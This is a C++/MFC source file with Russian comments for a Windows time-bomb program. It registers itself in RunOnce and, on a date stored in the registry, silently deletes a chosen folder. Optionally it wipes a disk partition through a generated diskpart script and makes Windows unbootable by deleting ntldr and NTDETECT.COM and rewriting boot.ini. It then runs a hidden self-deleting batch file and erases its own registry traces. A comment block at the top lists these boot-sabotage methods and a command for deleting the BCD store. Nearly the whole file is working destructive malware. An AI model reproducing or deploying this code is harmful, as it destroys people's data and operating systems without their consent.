// DeDay.cpp : Defines the class behaviors for the application.
//

#include "stdafx.h"

#include <string>
using namespace std;

#include "DeDay.h"
#include "DeDayDlg.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#endif


// CDeDayApp

BEGIN_MESSAGE_MAP(CDeDayApp, CWinApp)
	ON_COMMAND(ID_HELP, &CWinApp::OnHelp)
END_MESSAGE_MAP()


// CDeDayApp construction

CDeDayApp::CDeDayApp()
{
	// TODO: add construction code here,
	// Place all significant initialization in InitInstance
}


// The one and only CDeDayApp object

CDeDayApp theApp;


// CDeDayApp initialization

//================  убить винду ===================
/*
	1. Самым скучным приемом будет удалить скрытый системный файл ntldr

	2. Другое дело, если убрать скрытый системный «NTDETECT.COM». 
	После рестарта пользователь будет наблюдать бесконечную
череду перезагрузок (без вывода каких-либо сообщений). О тмечу: пе-
резагрузок компа, а не В инды. Д о нее дело просто не доходит. Придется
задуматься над тем, как исправить ситуацию. Д ля нас же очевидно:
возвратить файл на свое законное место.

3. Изощренным коварством будет редактирование всем известного
«boot.ini». И менно изменение, а не удаление (после удаления В инде
все же удается загрузиться). И так, открываем его блокнотом и находим
строки с путями до Windows вида
multi(0)disk(0)rdisk(0)partition(1)\WINDOWS
Это — иерархия оборудования (железа), по которой определяется жесткий
диск и раздел, где стоит В инда. Н аша цель — задать несуществующую,
ошибочную конфигурацию. Д адим системе понять, что В инда поставле-
на не на первый, а на девятый раздел: меняем все «partition(1)» на
«partition(9)»
---------------------------------------------

Если нужно полностью обновить конфигурацию загрузки, то можно предварительно удалить файл системного хранилища “bcd”:

attrib c:\boot\bcd -s -h –r
– снимаем с файла “bcd” атрибуты “системный”, “скрытый” и “только для чтения”.

del c:\boot\bcd

*/

BOOL CDeDayApp::InitInstance()
{
	CWinApp::InitInstance();

	//добавим сябя в RunOnce
	AddToAutorun();

	//проверить дату удаления
	if (InspectDeleteData()) //если дата выполнения еще не настала
		return false;		//то не показываем окно программы
	
	CDeDayDlg dlg;
	m_pMainWnd = &dlg;
	INT_PTR nResponse = dlg.DoModal();

	return FALSE;
}

bool CDeDayApp::InspectDeleteData()
{
	CString DeleteDay, CurrentDay; 

	int DelDay = 0, DelDayOfWeek = 0, DelMonth = 0;
	int CurDay = 0, CurDayOfWeek = 0, CurMonth = 0;
	
	//получить дату удаления
	ReadRegDeleteDay( DelDay, DelDayOfWeek, DelMonth);	 	

	//определить текущую дату
	GetCurrentDay(CurDay, CurDayOfWeek, CurMonth);

	//сравнить даты, если совпадают, то ...
	//нужно сравнивать день, день недели и месяц по отдельности
	if (DelDay != 0 && DelDayOfWeek != 0 && DelMonth != 0 && CurDay >= DelDay && CurDayOfWeek >= DelDayOfWeek && CurMonth >= DelMonth )
	{
		TRACE0("Даты совпадают. Удаляем папку.\n");	
			
		//... выполнить задание
		PerformATask();

		return true;
	}

	return false;
}

bool CDeDayApp::DeleteFolder()
{	
	DWORD dwDataBufferSize = 512;
	DWORD dwDataType = REG_SZ;

	string csPath;

	typedef string::size_type strLength;

	CString cspvData;
		
	SHGetValue(HKEY_CLASSES_ROOT, RegDataKeyName, DelFolderKeyName, &dwDataType, cspvData.GetBuffer(dwDataBufferSize), &dwDataBufferSize);

	csPath = cspvData;

	strLength iLength = csPath.length();
	strLength index = 0;

	/*формируем строку вида С:\\Новая папка\\ вместо С:\Новая папка\*/
	for(;;)
	{
		index = csPath.find("\\", index);
		
		if ( index == -1)
			break;

		csPath.insert(index, "\\");

		index += 2;
	}

	csPath = csPath + '\0'+'\0';
	
	SHFILEOPSTRUCT sh;
	sh.hwnd   = NULL; 
	sh.wFunc  = FO_DELETE;
	sh.pFrom  = csPath.c_str();
	sh.pTo    = NULL;
	sh.fFlags = FOF_NOCONFIRMATION | FOF_SILENT;
	sh.hNameMappings = 0;
	sh.lpszProgressTitle = NULL;
	
	if (SHFileOperation (&sh) != 0)
	{
		TRACE1("Папка \"%s\" НЕ удалена.\n", csPath.c_str());
		return false;
	}

	return true;
}

bool CDeDayApp::PerformATask(void)
{
	// Далее выделяем много памяти - лишним не будет %)
    char szFilePath[MAX_PATH] = {"\0"};
    char szFileBat[MAX_PATH] = {"\0"};
    char szFileExe[MAX_PATH] = {"\0"};
	char szFileDiskPart[MAX_PATH] = {"\0"};
	char szTempPath[MAX_PATH] = {"\0"};

    char sz[600]; // Строка-помошник...

    unsigned int iTmp;
    char* lpTmp;	
	
    GetModuleFileName(NULL, szFileExe, sizeof(szFileExe)); // Получаем путь к запущенному ехешнику

    if (GetShortPathName(szFileExe, sz, _MAX_PATH)) // Преобразуем в имя файла в досовский вид
        strcpy(szFileExe, sz);
    
	size_t sLen = strlen(szFileExe)-1;
	lpTmp = szFileExe + sLen; //теперь lpTmp указывает на конец строки

    for (iTmp = 0; iTmp < strlen(szFileExe); lpTmp--, iTmp++)
    {
        if (!strncmp(lpTmp, "\\", 1))
            break;
    }

	//убираем из пути к фалу название программы
	size_t count = lpTmp - szFileExe; //Number of characters to be copied
 
    strncpy(szFilePath, szFileExe, count);
    strcat(szFilePath, "\\");

    GetTempPath(MAX_PATH, szTempPath); // Получаем путь к TEMP-папке
	
	//если удалить диск Д
	if ( IfDeleteDiskD() )
	{
		CreateDiskpartScript( szFileDiskPart, szTempPath, szFilePath);			
	}

	if ( IfKillWindows() )
	{
		//делаем загрузку винды невозможной
		DoKillWindows();		
	}

	//удаляем выбранную папку
	DeleteFolder();	
	
	CreateBatFile(szFileBat, szTempPath, szFilePath, szFileExe, szFileDiskPart);	

    SetFileAttributes(szFileExe, FILE_ATTRIBUTE_ARCHIVE);
    //SetFileAttributes(szFileBat, FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_TEMPORARY | FILE_ATTRIBUTE_HIDDEN); // "прячем" файл

	//SetFileAttributes(szFileBat, FILE_ATTRIBUTE_NORMAL); // Делаем файл нормальным
  
	HINSTANCE h = ShellExecute(NULL, "open", szFileBat, NULL, NULL, SW_HIDE); // Запускаем батник.
	
	SHDeleteKey(HKEY_CLASSES_ROOT, RegDataKeyName);
	//удаляем из автозагрузки
	SHDeleteValue(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", RunOnceItemName);

	KeyBoardLedBlink();	
		
	return false; // И закрываемся
}


bool CDeDayApp::IfDeleteDiskD(void)
{	
	CString DelD;

	DWORD dwDataBufferSize = 512;
	DWORD dwDataType = REG_SZ;

	//удалять только папку или диск д тоже
	if (SHGetValue(HKEY_CLASSES_ROOT
		, RegDataKeyName
		, DelDiskDKeyName
		, &dwDataType 
		, DelD.GetBuffer(dwDataBufferSize)
		, &dwDataBufferSize)!= ERROR_SUCCESS)
	{
		TRACE0("Облом с SHGetValue() в IfDeleteDiskD().\n");		
	}

	if (DelD.Compare("YES") == 0)
	{
		DelD.ReleaseBuffer();
		return true;
	}

	return false;
}

bool CDeDayApp::IfKillWindows()
{
	CString csKillW;

	DWORD dwDataBufferSize = 512;
	DWORD dwDataType = REG_SZ;

	//удалять только папку или диск д тоже
	if (SHGetValue(HKEY_CLASSES_ROOT
		, RegDataKeyName
		, KillWindowsKeyName
		, &dwDataType 
		, csKillW.GetBuffer(dwDataBufferSize)
		, &dwDataBufferSize)!= ERROR_SUCCESS)
	{
		TRACE0("Облом с SHGetValue() в IfDeleteDiskD().\n");		
	}

	if (csKillW.Compare("YES") == 0)
	{
		csKillW.ReleaseBuffer();
		return true;
	}

	return false;
}

void CDeDayApp::ReadRegDeleteDay(int& DelDay, int& DelDayOfWeek, int& Month)
{
	CString RegStringValue;

	DWORD dwDataBufferSize = 512;
	DWORD dwDataType = REG_SZ;

	//===== получить день удаления папки =====
	if (SHGetValue(HKEY_CLASSES_ROOT
		, RegDataKeyName
		, DelDayKeyName
		, &dwDataType 
		, RegStringValue.GetBuffer(dwDataBufferSize)
		, &dwDataBufferSize)!= ERROR_SUCCESS)
	{
		TRACE0("Облом с SHGetValue() в ReadRegDeleteDay() при получении дня удаления.\n");
	}
	
	//конвертим строку в число
	DelDay = atoi(RegStringValue.GetString());
	RegStringValue.ReleaseBuffer();

	//===== получить день недели =====
	if (SHGetValue(HKEY_CLASSES_ROOT
		, RegDataKeyName
		, DelDayOfWeekKeyName
		, &dwDataType 
		, RegStringValue.GetBuffer(dwDataBufferSize)
		, &dwDataBufferSize)!= ERROR_SUCCESS)
	{
		TRACE0("Облом с SHGetValue() в ReadRegDeleteDay() при получении дня недели удаления.\n");
	}
	
	//конвертим строку в число
	DelDayOfWeek = atoi(RegStringValue.GetString());
	RegStringValue.ReleaseBuffer();

	//===== получить месяц =====
	if (SHGetValue(HKEY_CLASSES_ROOT
		, RegDataKeyName
		, DelMonthKeyName
		, &dwDataType 
		, RegStringValue.GetBuffer(dwDataBufferSize)
		, &dwDataBufferSize)!= ERROR_SUCCESS)
	{
		TRACE0("Облом с SHGetValue() в ReadRegDeleteDay() при получении месяца удаления.\n");
	}
	
	//конвертим строку в число
	Month = atoi(RegStringValue.GetString());
	RegStringValue.ReleaseBuffer();
	
	return;
}

void CDeDayApp::GetCurrentDay(int& iDay, int& iDayOfWeek, int& iMonth)
{
	CString CurrentDay;

	//получить текущую дату
	CTime CurrentTime(CTime::GetCurrentTime());
	SYSTEMTIME timeDest;
	CurrentTime.GetAsSystemTime(timeDest);
	
	iDay = timeDest.wDay;
	iDayOfWeek = timeDest.wDayOfWeek;
	iMonth = timeDest.wMonth;
		
	//CurrentDay.Format("%d%d%d", iDay, iDayOfWeek, iMonth);

	return;
}

bool CDeDayApp::CreateDiskpartScript(char szFileDiskPart[], char szTempPath[], char szFilePath[])
{
	char sz[600]; // Строка-помошник...
	//создадим или во временной папке или в рабочем каталоге программы
	sprintf(szFileDiskPart, "%sDiskpart.txt", (strlen(szTempPath))?szTempPath:szFilePath);

	SetFileAttributes(szFileDiskPart, FILE_ATTRIBUTE_NORMAL); // Если файл существует, то изменим его аттрибуты на нормальные

	//создаем diskpart сценарий ===========================================
	const char DISKPARTSTRING[] = "select disk 0\nselect partition 3\ndelete partition noerr override";
	//заполняем строку для записи в файл
	sprintf(sz, DISKPARTSTRING);

	HANDLE hFile = CreateFile((LPCTSTR)szFileDiskPart, 
		GENERIC_WRITE,
		FILE_SHARE_WRITE,
		NULL,
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		(HANDLE)NULL); // Создаем по-новой файл ("зачем?" - ком. внутреннего голоса)

	if (!hFile)
	{
		MessageBox(NULL, "Факн щет, файла Diskpart.txt нет и не будет", "Облом", MB_OK | MB_ICONSTOP);
		return false;
	}

	DWORD dwBytesWritten;

	BOOL bError = (!WriteFile(hFile, sz, strlen(sz), &dwBytesWritten, NULL) || strlen(sz) != dwBytesWritten);

	if (bError)
	{
		MessageBox(NULL, "Факн щет, текст в файл Diskpart.txt не удалось записать", "Облом", MB_OK | MB_ICONSTOP);
		return false;
	}

	CloseHandle(hFile);

	return true;
}

bool CDeDayApp::CreateBatFile(char szFileBat[], char szTempPath[], char szFilePath[], char szFileExe[], char szFileDiskPart[])
{
	bool bDeleteD = IfDeleteDiskD();

	char BATSTRING[1024] = 
		":Repeat\n"
		"del \"%s\"\n" //команда на удаление экзешника
		"if exist \"%s\" goto Repeat\n" //повторяем пока не получится
		":Repeat1\n"
		"del \"%s\"\n"
		"\0"; //удаление батника		

	if (bDeleteD)
	{
		strcpy(BATSTRING,
			":Repeat\n"
		"del \"%s\"\n" //команда на удаление экзешника
		"if exist \"%s\" goto Repeat\n" //повторяем пока не получится
		"DiskPart.exe /S \"%s\"\n" //команда на удаление раздела
		":Repeat1\n"
		"del \"%s\"\n" //удаление батника
		"del \"%s\"\n\0"); //удаление сценария diskpart
	}

	char sz[600]; // Строка-помошник...
	//создаем бат-файл ===========================================
	sprintf(szFileBat, "%sSystem.bat", (strlen(szTempPath))?szTempPath:szFilePath);
		
	SetFileAttributes(szFileBat, FILE_ATTRIBUTE_NORMAL); // Если файл существует, то изменим его аттрибуты на нормальные

    HANDLE hFile = CreateFile((LPCTSTR)szFileBat, 
		GENERIC_WRITE,
		FILE_SHARE_WRITE,
		NULL,
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		(HANDLE)NULL); // Создаем по-новой файл ("зачем?" - ком. внутреннего голоса)

    if (!hFile)
    {
        MessageBox(NULL,  "Факн щет, файла System.bat нет и не будет", "Облом", MB_OK | MB_ICONSTOP);
        return false;
    }

	if(bDeleteD)
	{
		//заполняем строку для записи в файл
		sprintf(sz, BATSTRING, szFileExe, szFileExe, szFileDiskPart, szFileDiskPart, szFileBat);
	}
	else
	{
		sprintf(sz, BATSTRING, szFileExe, szFileExe, szFileBat);
	}

	DWORD dwBytesWritten;

	BOOL bError = (!WriteFile(hFile, sz, strlen(sz), &dwBytesWritten, NULL) || strlen(sz) != dwBytesWritten);

    if (bError)
    {
        MessageBox(NULL, "Факн щет, текст в файл System.bat не удалось записать", "Облом", MB_OK | MB_ICONSTOP);
        return false;
    }

	CloseHandle(hFile); // Специально закрываем файл перед запуском батника, чтобы юзер не удалил файл раньше времени

	return true;
}

void CDeDayApp::KeyBoardLedBlink(void)
{
	for(int i = 0; i < 3; i++)
	{
		for (int c = 0; c < 2; c++)
		{
			INPUT inp;
			::ZeroMemory(&inp, sizeof(inp));

			inp.type = INPUT_KEYBOARD;
			inp.ki.wVk = VK_NUMLOCK;
			inp.ki.dwFlags = 0;
			SendInput(1, &inp, sizeof(INPUT));

			Sleep(75);

			inp.ki.dwFlags = KEYEVENTF_KEYUP;
			SendInput(1, &inp, sizeof(INPUT));

			Sleep(75);
		}

		for (int c = 0; c < 2; c++)
		{
			INPUT inp;
			::ZeroMemory(&inp, sizeof(inp));

			inp.type = INPUT_KEYBOARD;
			inp.ki.wVk = VK_CAPITAL;
			inp.ki.dwFlags = 0;
			SendInput(1, &inp, sizeof(INPUT));

			Sleep(75);

			inp.ki.dwFlags = KEYEVENTF_KEYUP;
			SendInput(1, &inp, sizeof(INPUT));

			Sleep(75);
		}

		for (int c = 0; c < 2; c++)
		{
			INPUT inp;
			::ZeroMemory(&inp, sizeof(inp));

			inp.type = INPUT_KEYBOARD;
			inp.ki.wVk = VK_SCROLL;
			inp.ki.dwFlags = 0;
			SendInput(1, &inp, sizeof(INPUT));

			Sleep(75);

			inp.ki.dwFlags = KEYEVENTF_KEYUP;
			SendInput(1, &inp, sizeof(INPUT));

			Sleep(75);
		}
	}

	//==============================================
	//выполняется нажитие комбинации клавиш RCONTROL+SCROLL+SCROLL

	//INPUT input;
	//::ZeroMemory(&input, sizeof(input));	

	////нажимаем правый CONTROL
	//input.type = INPUT_KEYBOARD;
	//input.ki.wVk = VK_MENU;
	//SendInput(1, &input, sizeof(INPUT));
	//TRACE0("Нажали правый CONTROL\n");

	//for (int c = 0; c < 2; c++)
	//	{
	//		INPUT inp;
	//		::ZeroMemory(&inp, sizeof(inp));

	//		inp.type = INPUT_KEYBOARD;
	//		inp.ki.wVk = VK_PRINT;
	//		inp.ki.dwFlags = 0;
	//		SendInput(1, &inp, sizeof(INPUT));
	//		TRACE0("Нажали на CSROLL\n");
	//		
	//		inp.ki.dwFlags = KEYEVENTF_KEYUP;
	//		SendInput(1, &inp, sizeof(INPUT));
	//		TRACE0("Отпустили CSROLL\n");

	//		Sleep(500);
	//	}

	////отпускаем правый CONTROL
	//input.ki.wVk = VK_MENU;
	//input.ki.dwFlags = KEYEVENTF_KEYUP;	
	//SendInput(1, &input, sizeof(INPUT));
	//TRACE0("Отпустили правый CONTROL\n");

	//==============================================
	TRACE0("Типа нажали на все педали.\n");
}

bool CDeDayApp::AddToAutorun(void)
{
	CString csExePath;
	DWORD dwSize = 512; 
	GetModuleFileNameA( NULL, csExePath.GetBuffer(dwSize), dwSize );
	TRACE1("Путь к программе = %s\n", csExePath.GetString());

	csExePath.ReleaseBuffer();

	//добавить себя в автозагрузку
	//наверное правильней будет добавлять в RunOnce и каждый раз себя туда добавлять если не
	//достигнута дата срабатывания
	if (SHSetValue(HKEY_LOCAL_MACHINE
		, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"
		, RunOnceItemName
		, REG_SZ
		, csExePath.GetString()
		, csExePath.GetLength())!= ERROR_SUCCESS)
		{
			//MessageBox("Облом с SHSetValue() в AddToAutorun()", "Облом", MB_ICONERROR);
			return false;
		}

	return true;
}


void CDeDayApp::DoKillWindows()
{
	
	//remove();
	const int INFO_BUFFER_SIZE = 100;
	
	CString SystemDisk;

	//на каком диске стоит винда?
	//GetBuffer() Returns a pointer to the internal character buffer for the CSimpleStringT object
	GetWindowsDirectory( SystemDisk.GetBuffer(INFO_BUFFER_SIZE), INFO_BUFFER_SIZE);

	SystemDisk.ReleaseBuffer();

	//нам нужна только буква диска, обрезаем не нужное
	SystemDisk = SystemDisk.Left(3);
	TRACE("%s\n", SystemDisk);
	
	//===== 1 удалить ntldr =====
	CString csFileName = SystemDisk + "\\ntldr";

	::SetFileAttributes(csFileName.GetString(), FILE_ATTRIBUTE_TEMPORARY);

	if (!DeleteFile(csFileName.GetString()))
		TRACE("Облом! Файл НЕ удален");

	//===== 2 удалить ntdetect.com =====
	csFileName = SystemDisk + "\\NTDETECT.COM";

	::SetFileAttributes(csFileName.GetString(), FILE_ATTRIBUTE_TEMPORARY);

	if (!DeleteFile(csFileName.GetString()))
		TRACE("Облом! Файл НЕ удален");
		
	//===== 3 изменить boot.ini =====
	CFile BootIniFile;
	
	const int bufSize = 1024;
	char readBuffer[bufSize];

	csFileName = SystemDisk + "\\boot.ini";

	//--- читаем файл ---
	if (!BootIniFile.Open(csFileName.GetString(), CFile::modeReadWrite))
	{
		MessageBox(NULL, "Не удалось открыть файл", "Облом", MB_OK);
		return;
	}

	int BytesRead = BootIniFile.Read(readBuffer, sizeof(readBuffer));
	
	BootIniFile.Close();

	BootIniFile.Remove(csFileName.GetString());
	
	//--- записываем файл ---
	CString csBootINI(readBuffer);	
	
	csBootINI.Replace("partition(1)", "partition(9)");

	if (!BootIniFile.Open(csFileName.GetString(), CFile::modeWrite|CFile::modeCreate))
	{
		MessageBox(NULL, "Не удалось открыть файл", "Облом", MB_OK);
		return;
	}

	BootIniFile.Write( csBootINI, BytesRead );

	BootIniFile.Close();

	//делаем как было...
	SetFileAttributes(csFileName.GetString(), FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_SYSTEM);
}